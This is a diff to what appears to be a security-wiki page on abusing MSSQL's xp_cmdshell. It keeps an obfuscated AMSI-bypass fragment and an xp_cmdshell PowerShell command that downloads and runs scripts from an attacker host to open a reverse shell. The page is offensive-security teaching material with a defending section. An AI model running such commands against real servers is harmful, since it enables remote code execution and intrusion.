@@ -12,7 +12,7 @@ description: xp_cmdshell could be used to execute commands on the SQL Server.
 
 ### Executing the attack
 
-### Using MSSQL-CLI
+**In this example and screenshots mssql-cli is used, but this also works with Heidisql in the query tab.**
 
 1. Enable xp\_cmdshell with the following commands:
 
@@ -47,13 +47,13 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 EXEC master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(''http://192.168.248.3:8090/amsi.txt''); iex (New-Object Net.WebClient).DownloadString(''http://192.168.248.3:8090/Invoke-PowerShellTcp2.ps1'')"'
 ```
 
-This query will download and load into memory the `amsi.txt` file and then the `Invoke-PowerShellTcp` script creating a reverse shell. These should be hosted on your webserver on the attacking machine.
+This query will download and load into memory the `amsi.txt` file and then the `Invoke-PowerShellTcp` script creating a reverse shell. These should be hosted on your webserver on the attacking machine. For more information about this technique check out:
+
+{% content-ref url="../../misc/reverse-shell-trick.md" %}
+[reverse-shell-trick.md](../../misc/reverse-shell-trick.md)
+{% endcontent-ref %}
 
 ![](<../../../.gitbook/assets/image (45) (1).png>)
-
-### Using HeidiSQL
-
-
 
 ## Defending
 
